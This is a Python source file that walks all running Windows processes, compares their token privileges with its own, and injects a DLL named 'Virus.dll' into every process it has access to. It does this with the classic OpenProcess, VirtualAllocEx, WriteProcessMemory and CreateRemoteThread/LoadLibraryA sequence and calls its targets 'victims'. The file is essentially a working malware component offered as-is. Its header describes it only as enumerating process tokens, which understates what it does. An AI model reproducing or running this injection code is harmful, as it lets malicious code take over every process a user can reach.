'''
    @file ProcessExecute
    @author Richard Howe
    Enumerates individual process tokens using WIN API function calls
'''
from ctypes import *
from os import getpid
from Process import Process
from psutil import process_iter, NoSuchProcess, AccessDenied, ZombieProcess


PAGE_READWRITE = 0x04
PROCESS_ALL_ACCESS = ( 0x00F0000 | 0x00100000 | 0xFFF )
VIRTUAL_MEM = ( 0x1000 | 0x2000 )

kernel32 = windll.kernel32


def inject(pid):
    dll_path = "Virus.dll"
    dll_len = len(dll_path)
    
    # Get handle to process being injected
    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    
    # Allocate space for DLL path
    arg_address = kernel32.VirtualAllocEx(h_process, 0, dll_len, VIRTUAL_MEM, PAGE_READWRITE)
    
    # Write DLL path to allocated space
    written = c_int(0)
    kernel32.WriteProcessMemory(h_process, arg_address, dll_path, dll_len, byref(written))
    
    # Resolve LoadLibraryA Address
    h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
    h_loadlib = kernel32.GetProcAddress(h_kernel32, "LoadLibraryA")
    
    # Now we createRemoteThread with entrypoiny set to LoadLibraryA and pointer to DLL path as param
    thread_id = c_ulong(0)

    if not kernel32.CreateRemoteThread(h_process, None, 0, h_loadlib, arg_address, 0, byref(thread_id)):
        print "[!] Failed to inject DLL, exit..."
        return False

    print "[+] Remote Thread with ID 0x%08x created." %(thread_id.value)
    return True

'''
    Check all running process privileges against self,
    Inject when possible.
    @param victim: Process to be hollowed.
    @return inject: True of dll injection is successful.
'''
def check(victim, c_proc):
    # True if victim is injectable
    injected = False
    # Abbreviation for victim proc privs
    v_privs = victim.priv.getTokenInformation()
    # Abbreviation for self proc privs
    c_privs = c_proc.priv.getTokenInformation()
    
    # If owners are the same, process is injectable (same proc context)
    if victim.getOwner() == c_proc.getOwner():
        if inject(victim.getPID()):
            injected = True
    
    # Check for equivalent proc privs using list comprehension  
    elif not [item for item in v_privs if item not in c_privs]:
        if inject(victim.getPID()):
            injected = True

    return injected

'''
    Starting point of the program.
    Iterates through all running processes and creates an
    array of Process objects then enumerates their process tokens.
'''
def main():
    # Pid of ProcessExecute
    c_pid= getpid()
    # Process instance of current running process
    c_proc = None  
    # List of Process Instances
    p_array = []
    # List of victim processes
    proc_injections = []

    # Create list of running processes and their privileges / tokens
    for proc in process_iter():
        try:
            p = Process(proc)
        except (NoSuchProcess, AccessDenied, ZombieProcess, TypeError):
            continue
        
         # Dont add current running process to list
        if p.getPID() == c_pid:
            c_proc = p
        else:
            p_array.append(p)

    # Check if processes are injectable & inject when possible
    for i in p_array:
        if check(i, c_proc):
            proc_injections.append(i)
    for i in proc_injections:
        output = "[*]Name: {}\n[*]PID: {}\n[*]Owner: {}\n\n".format(i.getName(), i.getPID(), i.getOwner())
        print(output)
main()
